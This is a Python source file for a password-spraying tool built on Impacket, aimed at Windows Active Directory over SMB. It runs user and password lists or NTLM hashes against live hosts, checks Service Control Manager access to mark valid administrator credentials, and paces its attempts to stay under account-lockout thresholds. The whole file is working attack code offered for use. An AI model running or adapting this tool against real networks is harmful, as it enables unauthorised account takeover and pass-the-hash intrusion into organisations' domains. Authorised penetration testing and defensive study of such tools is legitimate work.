from impacket.dcerpc.v5 import transport, scmr
from pebble import ProcessPool
from impacket import version
from time import sleep

import netifaces as ni
import ipaddress
import datetime
import readline
import argparse
import logging
import random
import nmap
import sys
import os

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_reset = '\033[0m'
color_PURP = '\033[35m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)
red_minus = "{}[-]{}".format(color_RED, color_reset)
gold_plus = "{}[+]{}".format(color_YELL, color_reset)
purple_plus = "{}[+]{}".format(color_PURP, color_reset)
password_list = []


def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
    print('\n[scanning hosts]')
    scanner = nmap.PortScanner()
    if os.path.isfile(inpu):  # if its in a file the arguments are different
        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
    else:
        scanner.scan(hosts=inpu, arguments='-n -sn')
    uphosts = scanner.all_hosts()

    try:
        uphosts.remove(local_ip)  # no point in attacking ourselves
    except:
        pass

    print('[scan complete]')

    return uphosts

def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKey=None, doKerberos=None, kdcHost=None, port=445):
    upasscombo = '{}:{}'.format(username, password)
    if domain == 'localauth':
        domain = remoteHost
    nthash = ''
    lmhash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')
        upasscombo = '{}:{}'.format(username, nthash)

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    logging.debug('StringBinding %s' % stringbinding)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(remoteHost)

    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

    rpctransport.set_kerberos(doKerberos, kdcHost)

    try:
        samr = rpctransport.get_dce_rpc()

        try:
            samr.connect()
        except Exception as e:
            if str(e).find('STATUS_ACCOUNT_LOCKED_OUT') != -1:
                with open('locked-slowspray', 'a') as f:
                    f.write('Locked\n')
                    f.close()
            if options.s == False or str(e).find('STATUS_ACCOUNT_LOCKED_OUT') != -1 or str(e).find('STATUS_PASSWORD_MUST_CHANGE') != -1 or str(e).find('STATUS_LOGON_TYPE_NOT_GRANTED') != -1 or str(e).find('STATUS_ACCOUNT_DISABLED') != -1 or str(e).find('STATUS_ACCOUNT_EXPIRED') != -1 or str(e).find('STATUS_ACCOUNT_RESTRICTION') != -1 or str(e).find('STATUS_INVALID_LOGON_HOURS') != -1 or str(e).find('STATUS_PASSWORD_EXPIRED') != -1 or str(e).find('STATUS_ACCESS_DENIED') != -1:
                print(purple_plus if str(e).find('STATUS_PASSWORD_MUST_CHANGE') != -1 or str(e).find('STATUS_LOGON_TYPE_NOT_GRANTED') != -1 or str(e).find('STATUS_ACCOUNT_DISABLED') != -1 or str(e).find('STATUS_ACCOUNT_EXPIRED') != -1 or str(e).find('STATUS_ACCOUNT_RESTRICTION') != -1 or str(e).find('STATUS_INVALID_LOGON_HOURS') != -1 or str(e).find('STATUS_PASSWORD_EXPIRED') != -1 or str(e).find('STATUS_ACCESS_DENIED') != -1 else red_minus, remoteName.ljust(20), upasscombo.ljust(30), str(e)[:str(e).find("(")])
            if options.o is not None:
                with open(options.o, 'a') as f:
                    f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), str(e)[:str(e).find("(")]))
                    f.close()

        s = rpctransport.get_smb_connection()
        s.setTimeout(100000)
        samr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(samr)
        scHandle = resp['lpScHandle']

        print(gold_plus, remoteName.ljust(20), upasscombo.ljust(30), "Valid Admin Creds")
        if options.o is not None:
             with open(options.o, 'a') as f:
                 f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Admin Creds"))
                 f.close()

    except  (Exception, KeyboardInterrupt) as e:

        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            print(green_plus, remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds")
            if options.o is not None:
                with open(options.o, 'a') as f:
                    f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds"))
                    f.close()

def mt_execute(username, host_ip, passwd, doit):  # multithreading requires a function
    skip = False
    try: # stop lockouts before they get too high
        with open('locked-slowspray', 'r') as f:
            dat = f.readlines()
            f.close()

        if len(dat) > options.l:
            skip = True
            print('{}[!]{} Stopping because account lockout threshold was hit'.format(color_RED, color_reset))
            sys.exit(1)
    except:
        pass

    if skip == False:
        try:
            sendit(username, passwd, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
        except Exception as e:
            print(str(e))
            if options.o is not None:
                with open(options.o, 'a') as f:
                    f.write(str(e) + '\n')
                    f.close()

        if options.delay is not None:
            sleep(options.delay)

        if doit == True:
            sleep(1)
            currtime = datetime.datetime.now()
            exptime = datetime.timedelta(minutes=options.pd)
            newtime = currtime + exptime
            print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))


if __name__ == '__main__':
    print(datetime.datetime.now().strftime("%D %H:%M:%S"))
    if os.path.isfile('locked-slowspray'):
        os.system('sudo rm locked-slowspray')
    parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
    parser.add_argument('-u', action='store', required=True, help='Username or path to file containing usernames 1 per line')
    parser.add_argument('-p', action='store', help='Password to try or file of passwords')
    parser.add_argument('-uap', action='store_true',  default=False, help='Sets the username as the password')
    parser.add_argument('-d', action='store', help='FQDN to use')
    parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
    parser.add_argument('-o', action='store', help='Output file')
    parser.add_argument('-s', action='store_true', default=False, help='Quiet mode will only print valid accounts')
    parser.add_argument('-m', action='store', default=1, type=int, help='Max amount of passwords to try before pausing Default=1')
    parser.add_argument('-pd', action='store', default=30, type=int, help='Duration to pause between the max amount of passwords (minutes) Default=30')
    parser.add_argument('-threads', action='store', default=1, type=int, help='Number of threads to use (Default=1)')
    parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account Default=NONE')
    parser.add_argument('target', action='store', help='IP to check the account against')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-method', action='store', choices=['random', 'sequence'], default='random',help='IP to check the account against')
    parser.add_argument('-ip', action='store', help='Your local ip or interface')
    parser.add_argument('-timeout', action='store', default=5, type=int, help='Timeout for each attempt (Default=5)')
    parser.add_argument('-l', action='store', default=5, type=int, help='Max amount of locked accounts before we stop(Default=5)')
    parser.add_argument('-localauth', action='store_true', default=False, help='Use a local account for authentication')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.o is not None:
        with open(options.o, 'a') as f:
            f.write(datetime.datetime.now().strftime("%D %H:%M:%S") + '\n')
            f.close()

    if os.geteuid() != 0:
        print("[!] Must be run as sudo")
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    if options.localauth:
        options.d = "localauth"

    if options.d is None:
        print(red_minus + " Domain is required")
        sys.exit(0)

    if options.H is not None and options.p is not None:
        print("You cannot use a hash and a password at the same time")
        sys.exit(0)

    if options.p is None and options.u != '' and options.H is None and options.uap == False:
        from getpass import getpass

        options.p = getpass("Password:")

    if options.H is not None:
        if options.H.find(':') == -1:
            options.H = ':' + options.H

    if options.H is None:
        if options.uap == False and options.p is not None:
            if os.path.isfile(options.p): # check if password is a file of passwords
                with open(options.p, 'r') as f:
                    unclean_passwords = f.readlines()
                    f.close()

                for item in unclean_passwords: # sanatize passwords
                    item = item.replace('\n', '')
                    item = item.replace('\r', '')
                    password_list.append(item)
            else:
                password_list.append(options.p)
        else:
            password_list.append('Username as Password')

    else:
        password_list.append(options.H)



    if len(password_list) < 1:
        print('Password list is empty')
        sys.exit(1)

    if options.ip is not None:  # did they give us the local ip in the command line
        local_ip = options.ip
        ifaces = ni.interfaces()
        try:  # check to see if the interface has an ip
            if local_ip in ifaces:
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                print("local IP => " + local_ip)
        except BaseException as exc:
            print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
            exit(0)
    else:
        # print local interfaces and ips
        print("")
        ifaces = ni.interfaces()
        for face in ifaces:
            try:  # check to see if the interface has an ip
                print('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))
            except BaseException as exc:
                continue

        local_ip = input("\nEnter you local ip or interface: ")

        # lets you enter eth0 as the ip
        if local_ip in ifaces:
            local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
            print("local IP => " + local_ip)
    try:
        ipaddress.ip_address(options.target)
        addresses = []
        addresses.append(options.target)
    except ValueError as e:
        addresses = do_ip(options.target, local_ip)

    if len(addresses) < 1:
        print("{} Error: No provided hosts are up".format(red_minus))
        sys.exit(0)

    users = []
    users_cleaned = []

    if os.path.isfile(options.u):
        with open(options.u, 'r') as f:
            users = f.readlines()
            f.close()

        for item in users:
            item = item.replace("\r", "")
            users_cleaned.append(item.replace("\n", ""))
    else:
        users_cleaned.append(options.u)

    if len(users_cleaned) < 1:
        print('User list is empty')
        sys.exit(1)

    print()

    if options.delay is not None: # so that the delay cannot exceed timeout
        options.timeout = options.timeout + options.delay
    count = 0
    doit = False
    firstprint = True
    if options.method == 'sequence':
        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
            for curr_ip in addresses:
                for password in password_list:
                    if len(password_list) == 1:
                        if firstprint:
                            print('Trying password: {}'.format(password))
                            if options.localauth:
                                print("Using Local Authentication")
                            firstprint = False
                    for username in users_cleaned:
                        if options.uap == True:
                            password = username
                        elif count+1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1: # in a sense if we are at the last password before our sleep and this is not the last password in the list and we are at the last username in the list we will set doit to true
                            doit = True

                        try:
                            out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
                            doit = False
                        except Exception as e:
                            print(str(e))
                    count += 1
                    if options.uap == False:
                        if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1: # second part basically ensures that the current password's index does not equal the end of the array to prevent a sleep when there is no need
                            count = 0
                            try:
                                sleep(options.pd * 60)
                            except KeyboardInterrupt as e:
                                print('\nCTRL+C detected continuing in 3')
                                sleep(1)
                                print('2')
                                sleep(1)
                                print('1')
                                sleep(1)
                                continue

    else:
        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
            for password in password_list:
                print('Trying password: {}'.format(password))
                if options.localauth:
                    print("Using Local Authentication")
                for username in users_cleaned:
                    curr_ip = addresses[random.randint(0, len(addresses)-1)]
                    if options.uap == True:
                        password = username
                    elif count + 1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1:
                        doit = True
                    try:
                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
                        doit = False
                    except Exception as e:
                        print(str(e))
                count += 1
                if options.uap == False:
                    if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1:
                        count = 0
                        try:
                            sleep(options.pd * 60)
                        except KeyboardInterrupt as e:
                            print('\nCTRL+C detected continuing in 3')
                            sleep(1)
                            print('2')
                            sleep(1)
                            print('1')
                            sleep(1)
                            continue
